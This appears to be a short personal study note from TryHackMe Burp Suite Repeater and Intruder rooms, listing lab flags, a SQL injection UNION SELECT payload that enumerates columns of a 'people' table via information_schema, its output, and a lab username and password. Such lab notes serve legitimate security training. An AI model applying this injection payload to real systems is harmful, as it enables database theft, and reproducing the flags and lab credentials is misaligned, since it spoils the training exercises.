# Burp_Suite___Repeater

<details open>
<summary>📋 Note Metadata</summary>

<dl>
<dt><b>Main Topic</b></dt><dd>Tools</dd>
<dt><b>Date</b></dt><dd>2026-03-17</dd>
<dt><b>Resources</b></dt><dd>https://tryhackme.com/room/burpsuiterepeater</dd>
<dt><b>Related Notes</b></dt><dd></dd>
<dt><b>Status</b></dt><dd>status/wip</dd>
<dt><b>Tags</b></dt><dd></dd>
</dl>

</details>

---

FlagAuthorised: True
THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}

---
GET /products/-1 HTTP/1.1
THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}

---
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='people'
About | id,firstName,lastName,pfpLink,role,shortRole,bio,notes None

---
# Burp_Suite___Intruder
username = m.rivera
password = letmein1

Ticket 83
THM{MTMxNTg5NTUzMWM0OWRlYzUzMDVjMzJl}

**[Burp Macros](https://tryhackme.com/room/burpsuiteintruder?taskNo=12&sharerId=6702abe0f77a70c90629f7db)**
